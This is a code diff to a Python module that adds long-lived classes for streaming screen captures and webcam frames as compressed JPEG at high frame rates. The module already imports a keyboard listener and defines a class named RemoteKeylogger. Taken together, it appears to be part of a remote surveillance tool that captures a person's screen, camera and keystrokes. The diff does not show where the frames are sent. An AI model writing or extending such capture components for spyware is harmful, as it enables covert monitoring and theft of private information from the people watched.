@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import os
 import threading
 import tkinter as tk
 from typing import Optional
@@ -9,6 +10,7 @@ from typing import Optional
 import cv2
 import mss
 import mss.tools
+import numpy as np
 from pynput import keyboard
 
 
@@ -97,6 +99,80 @@ def capture_camera_frame(camera_index: int = 0):
         return frame
     finally:
         camera.release()
+
+
+class ScreenStreamCapture:
+    """Long-lived, JPEG-encoded screen capture for high-frame-rate streams.
+
+    An instance must be created, read, and closed on the same worker thread
+    because MSS stores platform capture handles in thread-local storage.
+    """
+
+    def __init__(self, jpeg_quality: int = 65, max_width: int = 1280) -> None:
+        self.jpeg_quality = max(1, min(int(jpeg_quality), 100))
+        self.max_width = max(0, int(max_width))
+        self._capture = mss.mss()
+        self._monitor = self._capture.monitors[1]
+
+    def read_jpeg(self) -> bytes:
+        image = self._capture.grab(self._monitor)
+        # MSS returns BGRA; OpenCV's JPEG encoder expects BGR.
+        frame = np.asarray(image, dtype=np.uint8)[:, :, :3]
+        frame = _resize_to_max_width(frame, self.max_width)
+        success, encoded = cv2.imencode(
+            ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.jpeg_quality]
+        )
+        if not success:
+            raise RuntimeError("Failed to encode screen frame")
+        return encoded.tobytes()
+
+    def close(self) -> None:
+        self._capture.close()
+
+
+class CameraStreamCapture:
+    """Long-lived webcam capture; avoids reopening the device every frame."""
+
+    def __init__(
+        self,
+        camera_index: int = 0,
+        fps: float = 60,
+        jpeg_quality: int = 70,
+        max_width: int = 1280,
+    ) -> None:
+        backend = cv2.CAP_DSHOW if os.name == "nt" else cv2.CAP_ANY
+        self._camera = cv2.VideoCapture(camera_index, backend)
+        if not self._camera.isOpened():
+            self._camera.release()
+            raise RuntimeError(f"Unable to open camera {camera_index}")
+
+        self.jpeg_quality = max(1, min(int(jpeg_quality), 100))
+        self.max_width = max(0, int(max_width))
+        self._camera.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+        self._camera.set(cv2.CAP_PROP_FPS, max(float(fps), 1.0))
+
+    def read_jpeg(self) -> bytes:
+        success, frame = self._camera.read()
+        if not success or frame is None:
+            raise RuntimeError("Camera did not return a frame")
+        frame = _resize_to_max_width(frame, self.max_width)
+        success, encoded = cv2.imencode(
+            ".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, self.jpeg_quality]
+        )
+        if not success:
+            raise RuntimeError("Failed to encode webcam frame")
+        return encoded.tobytes()
+
+    def close(self) -> None:
+        self._camera.release()
+
+
+def _resize_to_max_width(frame: np.ndarray, max_width: int) -> np.ndarray:
+    if max_width <= 0 or frame.shape[1] <= max_width:
+        return frame
+    scale = max_width / frame.shape[1]
+    target_size = (max_width, max(1, round(frame.shape[0] * scale)))
+    return cv2.resize(frame, target_size, interpolation=cv2.INTER_AREA)
 
 
 class RemoteKeylogger:
